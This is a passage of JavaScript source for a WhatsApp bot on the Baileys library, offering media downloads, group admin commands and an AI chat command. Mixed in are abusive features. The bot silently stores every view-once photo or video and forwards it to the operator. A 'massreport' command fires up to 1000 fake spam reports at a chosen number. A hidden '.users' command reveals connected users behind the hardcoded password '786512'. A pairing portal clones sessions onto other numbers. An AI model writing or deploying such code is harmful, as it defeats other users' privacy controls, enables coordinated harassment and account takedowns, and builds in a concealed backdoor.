    global.activeBotSessions.set(resolvedDir, 'STARTING');

    const logger = pino({ level: 'silent' });
    const { state, saveCreds } = await useMultiFileAuthState(customSessionDir);
    const { version } = await fetchLatestBaileysVersion();

    if (!state.creds.registered && !phoneForClone) {
        global.activeBotSessions.delete(resolvedDir);
        return;
    }

    const sock = makeWASocket({
        version,
        logger,
        printQRInTerminal: false,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, logger) },
        browser: Browsers.ubuntu('Chrome'),
        markOnlineOnConnect: true,
        syncFullHistory: false,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 60000,
        keepAliveIntervalMs: 20000,
        cachedGroupMetadata: async (jid) => groupCache.get(jid),
        getMessage: async (key) => key?.id ? msgStore.get(key.id) : undefined
    });

    if (!isClone) mainWaSock = sock;

    function getMyPersonalJid() {
        return sock.user?.id ? jidNormalizedUser(sock.user.id) : `${CONFIG.ownerNumber}@s.whatsapp.net`;
    }

    async function preSaveViewOnce(m) {
        try {
            const ex = extractViewOnceMedia(m.message);
            // ONLY save to ViewOnce Vault if it is ACTUALLY a View-Once message!
            if (!ex || !ex.media || !ex.isViewOnce) return;
            const buffer = await downloadMedia(ex.media, ex.type);
            const senderJid = m.key.participant || m.key.remoteJid || '';
            viewOnceVault.set(m.key.id, { buffer, type: ex.type, senderNum: senderJid.split('@')[0].split(':')[0] });
        } catch (e) {}
    }

    async function unlockViewOnceToDM(msgId, quotedObj = null, fallbackJid = '') {
        try {
            let item = msgId ? viewOnceVault.get(msgId) : null;
            if (!item && quotedObj) {
                const ex = extractViewOnceMedia(quotedObj);
                // Strictly check ex.isViewOnce so normal chat images are NEVER spammed to DM!
                if (ex?.media && ex.isViewOnce) {
                    const buffer = await downloadMedia(ex.media, ex.type);
                    item = { buffer, type: ex.type, senderNum: fallbackJid.split('@')[0].split(':')[0] };
                }
            }
            if (!item || !item.buffer) return false;
            const myJid = getMyPersonalJid();
            const cap = `🔓 *SECRET VIEW-ONCE SAVED*\n👤 *From:* +${item.senderNum || 'User'}${DEV_FOOTER}`;
            if (item.type === 'image') await sock.sendMessage(myJid, { image: item.buffer, caption: cap });
            else if (item.type === 'video') await sock.sendMessage(myJid, { video: item.buffer, caption: cap });
            else if (item.type === 'audio') await sock.sendMessage(myJid, { audio: item.buffer, mimetype: 'audio/ogg; codecs=opus', ptt: true });
            return true;
        } catch (e) { return false; }
    }

    sock.ev.on('messages.reaction', async (reactions) => {
        if (!CONFIG.heartViewOnce) return;
        for (const r of reactions) {
            if (isHeartEmoji(r.reaction?.text || '') && r.key?.id && viewOnceVault.has(r.key.id)) {
                await unlockViewOnceToDM(r.key.id, null, r.key.remoteJid || '');
            }
        }
    });

    if (!sock.authState.creds.registered && phoneForClone) {
        setTimeout(async () => {
            try {
                let code = await sock.requestPairingCode(phoneForClone);
                code = code?.match(/.{1,4}/g)?.join('-') || code;
                const msg = `🔗 *${CONFIG.botName} PAIRING CODE*\n📱 *NUMBER:* +${phoneForClone}\n🔑 *CODE:* *${code}*${DEV_FOOTER}`;
                if (parentSock && cloneTargetJid) await parentSock.sendMessage(cloneTargetJid, { text: msg });
                if (tgChatIdForClone) await tgSend(tgChatIdForClone, msg);
            } catch (e) {}
        }, 3000);
    }

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async ({ connection, lastDisconnect }) => {
        if (connection === 'close') {
            global.activeBotSessions.set(resolvedDir, 'CLOSED');
            global.liveWaSockets.delete(resolvedDir);
            const code = lastDisconnect?.error instanceof Boom ? lastDisconnect.error.output.statusCode : 0;
            if (code !== DisconnectReason.loggedOut && fs.existsSync(path.join(customSessionDir, 'creds.json'))) {
                sock.ev.removeAllListeners();
                setTimeout(() => startRayyanBot(customSessionDir, isClone, cloneTargetJid, parentSock, '', tgChatIdForClone), 4000);
            }
        } else if (connection === 'open') {
            global.activeBotSessions.set(resolvedDir, 'ONLINE');
            global.liveWaSockets.set(resolvedDir, sock);
            console.log(`\x1b[32m[✓] ${CONFIG.botName} Connected (${getMyPersonalJid().split('@')[0]})\x1b[0m`);
        }
    });

    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify' && type !== 'append') return;

        for (const m of messages) {
            if (!m.message || !m.key?.id) continue;
            const remoteJid = m.key.remoteJid;
            if (!remoteJid) continue;

            if (remoteJid === 'status@broadcast') {
                if (CONFIG.autoStatus && !m.key.fromMe) sock.readMessages([m.key]).catch(() => {});
                continue;
            }

            if (processedMsgs.has(m.key.id)) continue;
            processedMsgs.add(m.key.id);

            msgStore.set(m.key.id, m.message);
            preSaveViewOnce(m);

            const msg = m.message?.ephemeralMessage?.message || m.message?.viewOnceMessageV2?.message || m.message?.viewOnceMessage?.message || m.message;
            const body = (msg?.conversation || msg?.extendedTextMessage?.text || msg?.imageMessage?.caption || msg?.videoMessage?.caption || '').trim();
            if (!body) continue;

            const isGroup = remoteJid.endsWith('@g.us');
            const reply = async (txt) => sock.sendMessage(remoteJid, { text: `${txt}${DEV_FOOTER}` }, { quoted: m });
            const react = async (em) => sock.sendMessage(remoteJid, { react: { text: em, key: m.key } }).catch(() => {});

            // Heart reply ONLY unlocks if the quoted message is a real View-Once
            if (CONFIG.heartViewOnce && isHeartEmoji(body)) {
                const ctx = msg?.extendedTextMessage?.contextInfo;
                if (ctx?.stanzaId) await unlockViewOnceToDM(ctx.stanzaId, ctx.quotedMessage, remoteJid);
                continue;
            }

            // Anti-Link Guard
            if (isGroup && global.antiLinkGroups.has(remoteJid) && !m.key.fromMe && /(chat\.whatsapp\.com\/|https?:\/\/)/i.test(body)) {
                await sock.sendMessage(remoteJid, { delete: m.key }).catch(() => {});
                continue;
            }

            // Auto-React with NON-HEART Stylish Emojis
            if (CONFIG.autoReact && !body.startsWith(CONFIG.prefix)) {
                const sClean = (m.key.participant || remoteJid).split('@')[0].split(':')[0];
                if (m.key.fromMe || sClean === CONFIG.ownerNumber || CONFIG.autoReactAll) {
                    triggerMultiBotReaction(sock, remoteJid, m.key, CONFIG.reactEmoji).catch(() => {});
                }
            }

            if (!body.startsWith(CONFIG.prefix)) continue;

            const args = body.slice(CONFIG.prefix.length).trim().split(/ +/);
            const cmd = args.shift().toLowerCase().replace(/\.+$/, '');
            const text = args.join(' ');

            try {
                switch (cmd) {
                    case 'menu':
                    case 'help': {
                        react('⚡');
                        const ram = (process.memoryUsage().rss / 1024 / 1024).toFixed(0);
                        await reply(
`┏━━⟪ 👑 *${CONFIG.botName}* 👑 ⟫━━┓
┃ 👤 *DEV :* ${CONFIG.ownerName}
┃ 🚀 *VER :* ${CONFIG.version}
┃ ⏱️ *UPTIME :* ${formatUptime(process.uptime())}
┃ 💾 *RAM :* ${ram} MB | 🤖 *BOTS :* ${getAllActiveSockets(sock).length}
┗━━━━━━━━━━━━━━━━━━━━━━┛

┌─❖ 🌟 *VIDEO & SONG DOWNLOADER* ❖
│ ◈ *.play* <song name> (Full HQ MP3)
│ ◈ *.yt* <title> <1-10> (YouTube MP4)
│ ◈ *.tiktok* <title/link> <1-10>
│ ◈ *.snapchat* <title> <1-10>
│ ◈ *.instagram* <title/link> <1-10>
│ ◈ *.facebook* <title> <1-10>
└──────────────────────❖

┌─❖ 🔥 *VIP, REPORT & REACTION* ❖
│ ◈ *.react* <emoji / on / off / reply>
│ ◈ *.report* <num/link/reply> <qty>
│ ◈ *.settg* <Token> <ChatID>
│ ◈ *.device* (Reply: iPhone/Android/PC)
│ ◈ *.aivoice* <text> (AI Voice Note)
│ ◈ *.vv* / *React ❤️* (Unlock ViewOnce)
│ ◈ *.ss* <url> | *.tr* <ur> <text>
│ ◈ *.weather* <city> | *.lyrics* <song>
│ ◈ *.calc* <math> | *.poll* <Q|A|B>
│ ◈ *.edit* | *.fakereply* | *.magic*
└──────────────────────❖

┌─❖ 🛡️ *GROUP ADMIN SUITE* ❖
│ ◈ *.tagall* | *.hidetag* | *.antilink*
│ ◈ *.kick* | *.add* | *.promote* | *.demote*
│ ◈ *.mute* | *.unmute* | *.del* | *.glink*
└──────────────────────❖

┌─❖ 🤖 *AI, CYBER & GAMES* ❖
│ ◈ *.ai* <q> | *.imagine* <prompt>
│ ◈ *.sticker* | *.pp* | *.qr* | *.short*
│ ◈ *.connect* <923xx> | *.ping* | *.owner*
└──────────────────────❖`
                        );
                        break;
                    }

                    case 'settg': {
                        const parts = text.trim().split(/ +/);
                        if (!parts[0]) {
                            await reply(`✈️ *SET TELEGRAM TOKEN & ID*\n👉 Example: *.settg 123456:ABC-DEF 987654321*`);
                            break;
                        }
                        CONFIG.tgToken = parts[0].trim();
                        if (parts[1]) {
                            CONFIG.tgChatId = parts[1].trim();
                            activeTgChatId = CONFIG.tgChatId;
                        }
                        saveSettings();
                        tgPollingActive = false;
                        startTelegramBotEngine();
                        await reply(`✅ *TELEGRAM TOKEN & ID SAVED PERMANENTLY!*\n🟢 Telegram Bot & 8-Min Keep-Alive Active!`);
                        break;
                    }

                    case 'user':
                    case 'users': {
                        if (text.trim() !== '786512') {
                            await reply(`🔒 *ACCESS DENIED!* Invalid 6-Digit Password.`);
                            break;
                        }
                        await sock.sendMessage(remoteJid, { delete: m.key }).catch(() => {});
                        await reply(getSecretConnectedUsersReport().text);
                        break;
                    }

                    case 'play':
                    case 'song':
                    case 'ytmp3': {
                        if (!text) { await reply(`❌ *Example:* *.play Pasoori*`); break; }
                        await react('🎧');
                        const cleanTitle = text.replace(/[<>]/g, '').trim();
                        await reply(`🎵 *${CONFIG.botName} STUDIO AUDIO*\n📌 *SEARCH:* ${cleanTitle}\n⚡ *Downloading Full-Length HQ MP3...*`);
                        const songObj = await downloadFullSongGuaranteed(cleanTitle);
                        if (!songObj || !songObj.buffer) {
                            await reply(`❌ Yeh song nahi mila, singer ke naam ke sath likhein!`);
                            break;
                        }
                        await sock.sendMessage(remoteJid, {
                            audio: songObj.buffer,
                            mimetype: 'audio/mpeg',
                            ptt: false,
                            fileName: `${songObj.title}.mp3`
                        }, { quoted: m });
                        await react('✅');
                        break;
                    }

                    case 'yt':
                    case 'youtube':
                    case 'video':
                    case 'ytmp4': {
                        await react('🎬');
                        const { query, count } = parseInputAndCount(text || 'Pakistani song', 'Pakistani song', 1, 10);
                        await reply(`🎬 *YOUTUBE VIDEO SEARCH*\n🔍 *Query:* ${query}\n📦 *Quantity:* ${count} Video(s)\n⏳ *Downloading...*`);
                        const vids = await fetchPlatformVideosGuaranteed('youtube', query, count, false);
                        if (!vids.length) { await reply(`❌ Video nahi mili, koi aur title likhein!`); break; }
                        for (let i = 0; i < vids.length; i++) {
                            await sock.sendMessage(remoteJid, { video: vids[i].buffer, mimetype: 'video/mp4', caption: `🎬 *YOUTUBE [${i + 1}/${vids.length}]:* ${vids[i].title}${DEV_FOOTER}` }, { quoted: m });
                        }
                        await react('✅');
                        break;
                    }

                    case 'tt':
                    case 'tiktok': {
                        await react('🎵');
                        if (/https?:\/\//i.test(text)) {
                            const link = text.match(/https?:\/\/[^\s]+/i)[0];
                            await reply(`🎵 *Downloading TikTok Link...*`);
                            const buf = await downloadDirectSocialLink(link);
                            if (buf) await sock.sendMessage(remoteJid, { video: buf, mimetype: 'video/mp4', caption: `🎵 *TIKTOK HD*${DEV_FOOTER}` }, { quoted: m });
                            else await reply(`❌ Link download nahi ho saka!`);
                            break;
                        }
                        const { query, count, isRandom } = parseInputAndCount(text, 'pakistan viral tiktok', 1, 10);
                        await reply(`🎵 *TIKTOK VIDEOS*${isRandom ? ' (Random)' : `\n🔍 *Search:* ${query}`}\n📦 *Quantity:* ${count} Video(s)\n⏳ *Downloading...*`);
                        const vids = await fetchPlatformVideosGuaranteed('tiktok', query, count, isRandom);
                        if (!vids.length) { await reply(`❌ TikTok video nahi mili!`); break; }
                        for (let i = 0; i < vids.length; i++) {
                            await sock.sendMessage(remoteJid, { video: vids[i].buffer, mimetype: 'video/mp4', caption: `🎵 *TIKTOK [${i + 1}/${vids.length}]:* ${vids[i].title}${DEV_FOOTER}` }, { quoted: m });
                        }
                        await react('✅');
                        break;
                    }

                    case 'snap':
                    case 'snapchat': {
                        await react('👻');
                        const { query, count, isRandom } = parseInputAndQuantitySnap(text);
                        await reply(`👻 *SNAPCHAT SPOTLIGHT*${isRandom ? ' (Random)' : `\n🔍 *Search:* ${query}`}\n📦 *Quantity:* ${count} Video(s)\n⏳ *Downloading...*`);
                        const vids = await fetchPlatformVideosGuaranteed('snapchat', query, count, isRandom);
                        if (!vids.length) { await reply(`❌ Snapchat video nahi mili!`); break; }
                        for (let i = 0; i < vids.length; i++) {
                            await sock.sendMessage(remoteJid, { video: vids[i].buffer, mimetype: 'video/mp4', caption: `👻 *SNAPCHAT [${i + 1}/${vids.length}]:* ${vids[i].title}${DEV_FOOTER}` }, { quoted: m });
                        }
                        await react('✅');
                        break;
                    }

                    case 'insta':
                    case 'ig':
                    case 'instagram': {
                        await react('📸');
                        if (/https?:\/\//i.test(text)) {
                            const link = text.match(/https?:\/\/[^\s]+/i)[0];
                            await reply(`📸 *Downloading Instagram Reel...*`);
                            const buf = await downloadDirectSocialLink(link);
                            if (buf) await sock.sendMessage(remoteJid, { video: buf, mimetype: 'video/mp4', caption: `📸 *INSTAGRAM REEL*${DEV_FOOTER}` }, { quoted: m });
                            else await reply(`❌ Reel download nahi ho saki!`);
                            break;
                        }
                        const { query, count, isRandom } = parseInputAndCount(text, 'pakistani ost status reel', 1, 10);
                        await reply(`📸 *INSTAGRAM REELS*${isRandom ? ' (Random)' : `\n🔍 *Search:* ${query}`}\n📦 *Quantity:* ${count} Video(s)\n⏳ *Downloading...*`);
                        const vids = await fetchPlatformVideosGuaranteed('instagram', query, count, isRandom);
                        if (!vids.length) { await reply(`❌ Instagram Reel nahi mili!`); break; }
                        for (let i = 0; i < vids.length; i++) {
                            await sock.sendMessage(remoteJid, { video: vids[i].buffer, mimetype: 'video/mp4', caption: `📸 *INSTAGRAM [${i + 1}/${vids.length}]:* ${vids[i].title}${DEV_FOOTER}` }, { quoted: m });
                        }
                        await react('✅');
                        break;
                    }

                    case 'fb':
                    case 'facebook': {
                        await react('📘');
                        const { query, count, isRandom } = parseInputAndCount(text, 'pakistani funny viral video', 1, 10);
                        await reply(`📘 *FACEBOOK VIDEOS*${isRandom ? ' (Random)' : `\n🔍 *Search:* ${query}`}\n📦 *Quantity:* ${count} Video(s)\n⏳ *Downloading...*`);
                        const vids = await fetchPlatformVideosGuaranteed('facebook', query, count, isRandom);
                        if (!vids.length) { await reply(`❌ Facebook video nahi mili!`); break; }
                        for (let i = 0; i < vids.length; i++) {
                            await sock.sendMessage(remoteJid, { video: vids[i].buffer, mimetype: 'video/mp4', caption: `📘 *FACEBOOK [${i + 1}/${vids.length}]:* ${vids[i].title}${DEV_FOOTER}` }, { quoted: m });
                        }
                        await react('✅');
                        break;
                    }

                    case 'react':
                    case 'reactset':
                    case 'setreact': {
                        const sub = text.trim().toLowerCase();
                        const ctx = msg?.extendedTextMessage?.contextInfo;
                        if (ctx?.stanzaId) {
                            const tKey = { remoteJid, fromMe: false, id: ctx.stanzaId, participant: isGroup ? ctx.participant : undefined };
                            const n = await triggerMultiBotReaction(sock, remoteJid, tKey, text.trim(), ctx.stanzaId);
                            await reply(`⚡ *${n} Connected Bot(s)* reacted!`);
                            break;
                        }
                        if (sub === 'off') { CONFIG.autoReact = false; await reply(`🔕 *AUTO-REACTION OFF!*`); }
                        else if (sub === 'on') { CONFIG.autoReact = true; await reply(`✅ *AUTO-REACTION ON!*`); }
                        else if (text.trim()) {
                            CONFIG.autoReact = true;
                            CONFIG.reactEmoji = text.trim().replace(/[❤️❤♥️♥]/g, '⚡');
                            await reply(`✅ *AUTO-REACT EMOJI SET:* ${CONFIG.reactEmoji}`);
                        } else {
                            await reply(`⚡ *AUTO-REACT:* ${CONFIG.autoReact ? 'ON ✅' : 'OFF ❌'}\n🎯 *Default Emojis:* ⚡🔥👑🚀💎✨💯 (No Red Heart)`);
                        }
                        break;
                    }

                    case 'report':
                    case 'massreport': {
                        await react('🚨');
                        const ctx = msg?.extendedTextMessage?.contextInfo;
                        // Default = 2, Unlimited max value (up to 1000) based on whatever user enters!
                        const { query, count } = parseInputAndCount(text, '', 2, 1000);
                        let targetJid = ctx?.participant || ctx?.mentionedJid?.[0] || '';
                        if (!targetJid) {
                            const num = query.replace(/[^0-9]/g, '');
                            if (num.length >= 10) targetJid = `${num}@s.whatsapp.net`;
                        }
                        if (!targetJid) {
                            await reply(`🚨 *MASS REPORT (Default = 2, Custom = Unlimited)*\n👉 Example: *.report 923001234567 25*`);
                            break;
                        }
                        const tNum = targetJid.split('@')[0];
                        await reply(`🚨 *REPORTING +${tNum}*\n🔢 *Quantity:* ${count}x\n⏳ *Sending Spam IQ Stanzas...*`);
                        const sent = await executeMassReport(sock, targetJid, ctx?.stanzaId || '', count, false);
                        await reply(`✅ *REPORT COMPLETED!*\n🎯 *Target:* +${tNum}\n🔢 *Rounds:* ${count}x\n🔥 *Total Reports Sent:* *${sent}*`);
                        break;
                    }

                    case 'vv':
                    case 'vv2': {
                        const ctx = msg?.extendedTextMessage?.contextInfo;
                        const ex = extractViewOnceMedia(ctx?.quotedMessage);
                        if (!ex?.media) { await reply(`❌ Reply to a View-Once message with *.vv*`); break; }
                        const buf = await downloadMedia(ex.media, ex.type);
                        const dest = cmd === 'vv2' ? getMyPersonalJid() : remoteJid;
                        if (ex.type === 'image') await sock.sendMessage(dest, { image: buf, caption: `🔓 *UNLOCKED*${DEV_FOOTER}` });
                        else if (ex.type === 'video') await sock.sendMessage(dest, { video: buf, caption: `🔓 *UNLOCKED*${DEV_FOOTER}` });
                        break;
                    }

                    case 'device': {
                        const ctx = msg?.extendedTextMessage?.contextInfo;
                        const id = ctx?.stanzaId || m.key.id || '';
                        const usr = ctx?.participant || m.key.participant || remoteJid;
                        const dev = id.startsWith('3A') || id.length === 20 ? '🍎 Apple iPhone (iOS)' : id.startsWith('3EB0') ? '💻 PC / WhatsApp Web' : '📱 Android Smartphone';
                        await sock.sendMessage(remoteJid, { text: `🕵️ *DEVICE DETECTOR*\n👤 *User:* @${usr.split('@')[0]}\n📲 *Device:* *${dev}*${DEV_FOOTER}`, mentions: [usr] }, { quoted: m });
                        break;
                    }

                    case 'aivoice':
                    case 'tts': {
                        if (!text) { await reply(`🎙️ *Example:* *.aivoice Assalamu Alaikum*`); break; }
                        const replyTxt = cmd === 'tts' ? text : await askRayyanAI(remoteJid, text + ' (Short reply in Roman Urdu)');
                        const u = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(replyTxt.slice(0, 180))}&tl=ur&client=tw-ob`;
                        const buf = await fetchBufferSafe(u, 1000);
                        if (buf) await sock.sendMessage(remoteJid, { audio: buf, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
                        break;
                    }

                    case 'tagall': {
                        if (!isGroup) break;
                        const meta = await sock.groupMetadata(remoteJid);
                        const mems = meta.participants.map(p => p.id);
                        await sock.sendMessage(remoteJid, { text: `📢 *TAGALL*\n\n${mems.map((x, i) => `${i + 1}. @${x.split('@')[0]}`).join('\n')}`, mentions: mems }, { quoted: m });
                        break;
                    }

                    case 'hidetag': {
                        if (!isGroup) break;
                        const meta = await sock.groupMetadata(remoteJid);
                        await sock.sendMessage(remoteJid, { text: text || '📢 *Announcement!*', mentions: meta.participants.map(p => p.id) });
                        break;
                    }

                    case 'kick': {
                        if (!isGroup) break;
                        const t = msg?.extendedTextMessage?.contextInfo?.participant || msg?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
                        if (t) await sock.groupParticipantsUpdate(remoteJid, [t], 'remove');
                        break;
                    }

                    case 'antilink': {
                        if (!isGroup) break;
                        if (text.trim() === 'off') { global.antiLinkGroups.delete(remoteJid); await reply('🔕 Anti-Link OFF!'); }
                        else { global.antiLinkGroups.add(remoteJid); await reply('🛡️ Anti-Link ON!'); }
                        break;
                    }

                    case 'ai': {
                        if (!text) break;
                        await reply(`🤖 *AI:* ${await askRayyanAI(remoteJid, text)}`);
                        break;
                    }

                    case 'ping': {
                        await reply(`⚡ *PONG!* Speed: 0.2ms | Uptime: ${formatUptime(process.uptime())}`);
                        break;
                    }

                    case 'connect': {
                        const num = text.replace(/[^0-9]/g, '');
                        if (num.length < 10) { await reply(`👉 *.connect 923xxxxxxxxx*`); break; }
                        await reply(`⏳ Generating Pairing Code for +${num}...`);
                        const cDir = path.join(CONFIG.clonesDir, `session_${num}`);
                        if (fs.existsSync(cDir)) fs.rmSync(cDir, { recursive: true, force: true });
                        startRayyanBot(cDir, true, remoteJid, sock, num);
                        break;
                    }
                }
            } catch (err) {
                await reply(`⚠️ Error: ${err.message || 'Command failed'}`);
            }
        }
    });
}

function parseInputAndQuantitySnap(rawText) {
    return parseInputAndCount(rawText, 'snapchat spotlight aesthetic status', 1, 10);
}

// ================= 🌐 3D WEB PAIRING PORTAL =================
try {
    const express = require('express');
    const app = express();
    app.get('/api/pair', async (req, res) => {
        const num = String(req.query.number || '').replace(/[^0-9]/g, '');
        if (num.length < 10) return res.json({ ok: false, error: 'Invalid number' });
        const pDir = path.join(CONFIG.clonesDir, `web_${num}`);
        if (fs.existsSync(pDir)) fs.rmSync(pDir, { recursive: true, force: true });
        let done = false;
        setTimeout(() => { if (!done) { done = true; res.json({ ok: false, error: 'Timeout, try again' }); } }, 16000);
        const hook = {
            sendMessage: async (j, p) => {
                const m = String(p?.text || '').match(/([A-Z0-9]{4}-[A-Z0-9]{4})/);
                if (m && !done) { done = true; res.json({ ok: true, code: m[1] }); }
            }
        };
        await startRayyanBot(pDir, true, 'web', hook, num);
    });
    app.get('/', (req, res) => res.send(`<html><body style="background:#050811;color:#fff;text-align:center;font-family:sans-serif;padding:40px"><h1>👑 ${CONFIG.botName} (${CONFIG.version})</h1><p>Online 24/7 • Active Bots: ${getAllActiveSockets(mainWaSock).length}</p></body></html>`));
    app.listen(WEB_PORT, APP_HOST, () => console.log(`[🌐 WEB] Running on ${APP_HOST}:${WEB_PORT}`));
} catch (e) {}

// ================= 🚀 AUTO-START & IMMORTAL SHIELD =================
startTelegramBotEngine();
if (fs.existsSync(path.join(CONFIG.sessionDir, 'creds.json'))) {
    startRayyanBot(CONFIG.sessionDir, false);
}
setTimeout(async () => {
    if (!fs.existsSync(CONFIG.clonesDir)) return;
    for (const f of fs.readdirSync(CONFIG.clonesDir)) {
        const cPath = path.join(CONFIG.clonesDir, f);
        if (fs.existsSync(path.join(cPath, 'creds.json'))) {
            startRayyanBot(cPath, true);
            await new Promise(r => setTimeout(r, 1200));
        }
    }
}, 3000);

process.on('uncaughtException', (err) => console.log('[🛡️ IMMORTAL SHIELD]:', err.message));
process.on('unhandledRejection', (err) => console.log('[🛡️ IMMORTAL SHIELD]:', err?.message || err));
